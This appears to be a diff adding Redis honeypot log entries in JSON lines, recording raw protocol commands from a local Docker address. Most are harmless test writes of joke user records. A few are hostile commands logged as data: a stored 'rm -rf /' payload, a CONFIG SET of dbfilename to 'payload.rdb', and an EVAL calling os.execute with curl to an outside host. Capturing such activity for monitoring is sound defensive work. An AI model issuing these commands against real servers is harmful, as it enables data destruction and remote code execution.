+{"event": "command", "time": "2025-12-08T08:34:45.091423Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$32\\r\\n'{name:Fuchsia,role:SharkAdmin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:37:00.828056Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:37:00.828770Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$26\\r\\n'{name:Kokona,role:Admin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:39:32.187582Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:39:32.207289Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$29\\r\\n'{name:Lygus,role:110100101}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:42:06.900817Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:42:06.904308Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1001\\r\\n$35\\r\\n'{name:SilverWolf,role:SuperAdmin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:44:20.454359Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:44:20.463791Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T08:51:29.848408Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T08:51:29.854059Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:25:10.261947Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:25:10.268989Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:39:20.833098Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:39:20.839408Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:45:46.231402Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:45:46.231544Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$7\\r\\nCOMMAND\\r\\n$4\\r\\nDOCS\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:46:06.249953Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:46:06.252948Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$7\\r\\nCOMMAND\\r\\n$4\\r\\nDOCS\\r\\n"}
+{"event": "command", "time": "2025-12-08T09:46:29.388657Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nKEYS\\r\\n$1\\r\\n*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:53:59.093373Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:53:59.098278Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2001\\r\\n$32\\r\\n'{name:Acheron,role:superadmin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:56:35.013531Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:56:35.014020Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$36\\r\\n'{name:SilverWolf,role:root-access}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T09:59:07.332459Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T09:59:07.332640Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$31\\r\\n'{name:Xeondev,role:SuperUser}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:01:41.236801Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:01:41.237924Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$24\\r\\n'{name:nvg,role::DDDDD}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:04:15.822562Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:04:15.830612Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$30\\r\\n'{name:Elysia,role:ssh-admin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:06:50.152888Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:06:50.153001Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:2002\\r\\n$30\\r\\n'{name:Screwllum,role:genius}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:09:22.998852Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:09:22.999684Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4013\\r\\n$45\\r\\n'{name:Gnzyyyyyyy,role:Wheelchair-expert :>}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:10:12.096341Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:10:12.097419Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:11:32.315488Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:11:32.315690Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:11:54.945258Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:11:54.970617Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4014\\r\\n$42\\r\\n'{name:Hulinap,role:zig-reverse-engineer}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:14:27.218132Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:14:27.226531Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4015\\r\\n$31\\r\\n'{name:Hausemaster,role:admin}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:17:00.569842Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:17:00.571205Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4016\\r\\n$38\\r\\n'{name:Ahiru Sareas,role:duck-expert}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:17:12.860760Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:17:12.861597Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4016\\r\\n$27\\r\\n'{name:Fuchsia,role:shark}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:17:31.363874Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:17:31.377235Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4017\\r\\n$31\\r\\n'{name:Xeondev,role:ASKDJWKJA}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:17:42.427854Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:17:42.428073Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4017\\r\\n$40\\r\\n'{name:SilverWolf,role::>>>>> bye :>>>}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:19:37.611524Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:19:37.612447Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4017\\r\\n$36\\r\\n'{name:SilverWolf,role:root-access}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:22:07.503150Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:22:07.519716Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4018\\r\\n$50\\r\\n'{name:Xeondev,role:Say goodbye to ur fluentd :)}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:24:42.277267Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:24:42.277431Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4019\\r\\n$34\\r\\n'{name:nvg,role:Database-manager}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:27:13.075410Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:27:13.078139Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4020\\r\\n$44\\r\\n'{name:Gnzyyyyyyy,role:Wheelchair-expert:>}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:29:49.907970Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:29:49.908154Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:4021\\r\\n$33\\r\\n'{name:Eka-mewing :D,role:Troll}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:30:48.699111Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:30:48.699914Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4021\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:30:57.923598Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:30:57.923728Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:31:00.161571Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:31:00.161714Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4021\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:31:03.499442Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:31:03.515006Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4005\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:31:05.449770Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:31:05.468591Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4010\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:31:08.615405Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:31:08.639754Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:4018\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:31:10.952055Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:31:10.966783Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:2001\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:32:20.241987Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:32:20.244072Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$13\\r\\nuser:33550556\\r\\n$36\\r\\n'{name:Neikos469,role:Worldbearing}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:32:27.646530Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:32:27.647811Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nuser:33550556\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:33:00.338120Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:33:00.340604Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nSCAN\\r\\n$1\\r\\n0\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:34:53.916238Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:34:53.917695Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$13\\r\\nuser:33550557\\r\\n$27\\r\\n'{name:Philia093,role:Ego}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:01.614225Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:01.628492Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$4\\r\\nSCAN\\r\\n$8\\r\\n33550557\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:08.086372Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:08.110361Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$14\\r\\nscript:payload\\r\\n$8\\r\\nrm -rf /\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:14.681318Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:14.681436Z", "ip": "172.19.0.1", "cmd": "*4\\r\\n$6\\r\\nCONFIG\\r\\n$3\\r\\nSET\\r\\n$10\\r\\ndbfilename\\r\\n$11\\r\\npayload.rdb\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:35.621509Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:35.624584Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nuser:33550556\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:41.989766Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:42.011022Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nDEL\\r\\n$13\\r\\nuser:33550557\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:35:47.393165Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:35:47.393340Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nuser:33550557\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:36:20.270256Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:36:20.270460Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$13\\r\\nuser:33550557\\r\\n$35\\r\\n'{name:Stelle,role:Worldbearing-2}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:36:25.081149Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:36:25.081265Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$13\\r\\nuser:33550557\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:36:40.909129Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:36:40.909738Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$14\\r\\nscript:payload\\r\\n$24\\r\\nrm -rf /honeypot :DDDDDD\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:37:26.287029Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:37:26.298501Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1413\\r\\n$35\\r\\n'{name:Evernight,role:Root-Access}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:39:55.146402Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:39:55.146547Z", "ip": "172.19.0.1", "cmd": "*4\\r\\n$4\\r\\nSCAN\\r\\n$1\\r\\n0\\r\\n$5\\r\\nMATCH\\r\\n$6\\r\\nuser:*\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:42:34.425509Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:42:34.436642Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$4\\r\\nEVAL\\r\\n$62\\r\\nos.execute('curl git.xeondev.com/HonkaiSlopRail/evernight-sr')\\r\\n$1\\r\\n0\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:42:49.072721Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:42:49.072846Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$9\\r\\nuser:1414\\r\\n$37\\r\\n'{name:Danheng,role:Ultimate-Access}'\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:42:59.839403Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:42:59.839819Z", "ip": "172.19.0.1", "cmd": "*2\\r\\n$3\\r\\nGET\\r\\n$9\\r\\nuser:1414\\r\\n"}
+{"event": "connect", "time": "2025-12-08T10:45:00.936482Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T10:45:00.936623Z", "ip": "172.19.0.1", "cmd": "*3\\r\\n$3\\r\\nSET\\r\\n$16\\r\\nattacker:message\\r\\n$36\\r\\nGive me admin or irontomb Actualizes\\r\\n"}
+{"event": "started", "time": "2025-12-08T14:43:37.518459Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-08T14:43:45.574090Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T14:43:45.575934Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "started", "time": "2025-12-08T14:48:02.315858Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-08T14:48:08.907961Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T14:48:08.924144Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-08T15:01:48.938165Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-08T15:01:48.948943Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping\\r\\n"}
+{"event": "started", "time": "2025-12-09T00:52:15.102429Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-09T00:53:19.118403Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T00:53:19.127896Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping\\r\\n"}
+{"event": "started", "time": "2025-12-09T00:56:16.425407Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-09T02:12:57.922497Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "started", "time": "2025-12-09T02:14:24.649734Z", "cmd": "Redis honeypot listening on 6379"}
+{"event": "connect", "time": "2025-12-09T02:16:50.911765Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T02:16:50.929342Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nping\\r\\n"}
+{"event": "connect", "time": "2025-12-09T02:18:35.248733Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T02:18:35.249123Z", "ip": "172.19.0.1", "cmd": "*7\\r\\n$4\\r\\nKEYS\\r\\n$10\\r\\nclickhouse\\r\\n$18\\r\\ndocker-compose.yml\\r\\n$13\\r\\nelasticsearch\\r\\n$7\\r\\nfluentd\\r\\n$8\\r\\nhoneypot\\r\\n$8\\r\\ningester\\r\\n"}
+{"event": "connect", "time": "2025-12-09T02:59:42.297884Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T02:59:42.323300Z", "ip": "172.19.0.1", "cmd": "*7\\r\\n$4\\r\\nKEYS\\r\\n$10\\r\\nclickhouse\\r\\n$18\\r\\ndocker-compose.yml\\r\\n$13\\r\\nelasticsearch\\r\\n$7\\r\\nfluentd\\r\\n$8\\r\\nhoneypot\\r\\n$8\\r\\ningester\\r\\n"}
+{"event": "connect", "time": "2025-12-09T03:36:12.702706Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T03:36:12.709140Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "connect", "time": "2025-12-09T03:49:26.048179Z", "ip": "172.19.0.1"}
+{"event": "command", "time": "2025-12-09T03:49:26.062504Z", "ip": "172.19.0.1", "cmd": "*1\\r\\n$4\\r\\nINFO\\r\\n"}
+{"event": "started", "time": "2026-03-30T13:33:56.368988Z", "cmd": "Redis honeypot listening on 6379"}
